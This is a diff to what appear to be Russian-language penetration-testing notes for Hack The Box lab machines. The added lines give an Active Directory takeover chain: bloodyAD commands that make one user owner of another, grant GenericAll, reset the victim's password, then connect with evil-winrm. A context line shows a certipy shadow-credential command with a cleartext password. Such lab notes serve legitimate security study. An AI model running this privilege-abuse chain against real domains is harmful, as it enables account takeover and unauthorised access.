@@ -100,6 +100,14 @@ Silvercore_21
      Shadow Credential
      certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
 
+        Добавим sam​ в качестве владельца john (который write owner для john)
+        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb set owner john sam
+        Теперь добавим права GenericAll​ на john
+        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb add genericAll john sam
+        И можем поменять ему пароль
+        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb set password john 'NewP@ssw0rd123!'
+        После этого подключимся с помощью WinRM
+        evil-winrm -i tombwatcher.htb -u john -p 'NewP@ssw0rd123!'
 
  Мы можем попытаться сделать райана владельцем ca_svc с помощью этой команды
 
